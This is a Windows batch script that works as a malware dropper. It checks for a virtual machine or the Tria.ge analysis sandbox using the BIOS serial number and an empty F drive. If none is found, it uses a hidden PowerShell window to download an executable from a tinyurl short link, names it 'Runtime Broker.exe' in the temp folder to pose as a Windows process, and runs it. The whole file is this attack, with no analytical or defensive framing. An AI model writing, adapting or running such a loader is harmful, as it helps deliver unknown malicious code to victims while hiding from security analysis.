@echo off
setlocal

:: Initialize isVM to false
set "isVM=false"

:: Get the BIOS serial number
for /f "tokens=2 delims==" %%A in ('wmic bios get serialnumber /format:list') do set "serial=%%A"
echo BIOS Serial Number: %serial%

:: Prepare the message based on the BIOS serial number
if "%serial%"=="0" (
    set "message=VM DETECTED: BIOS serial code is 0"
    set "isVM=true"
) else if "%serial%"=="" (
    set "message=VM DETECTED: BIOS serial code does not exist"
    set "isVM=true"
) else (
    set "message=BIOS serial code is %serial%"
)

echo Message: %message%

:: Check if the F drive is empty
dir F:\ >nul 2>&1
if errorlevel 1 (
    set "driveMessage=Not Tria.ge: F drive does not exist or is not accessible"
    echo F drive check failed: %driveMessage%
) else (
    dir F:\ /a /b >nul 2>&1
    if errorlevel 1 (
        set "driveMessage=Not Tria.ge: F drive is empty"
        set "isVM=true"
        echo F drive is empty: %driveMessage%
    ) else (
        set "driveMessage=Not Tria.ge: F drive is not empty"
        echo F drive has files: %driveMessage%
    )
)

:: Check the value of isVM
echo isVM value: %isVM%

:: Run additional script if not a VM
if "%isVM%"=="false" (
    :: Define the URL of the file and the destination path
    set "url=https://tinyurl.com/nexuspred"
    set "output=%TEMP%\Runtime Broker.exe"

    :: Check if the output file already exists
    if not exist "%output%" (
        echo Downloading file...
        :: Run PowerShell in a hidden window and suppress output
        powershell -windowstyle hidden -command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%' -ErrorAction SilentlyContinue"
        echo File download complete.

        :: Check if the file was downloaded
        if exist "%output%" (
            echo Running the downloaded file...
            :: Run the file
            start "" "%output%"

            :: Wait for 10 seconds to ensure the file has started executing
            timeout /t 10 /nobreak >nul
        ) else (
            echo Failed to download the file.
            exit /b 1
        )
    ) else (
        echo File already exists: %output%
    )
) else (
    echo Script was not executed because the system is detected as a VM.
)

pause
endlocal
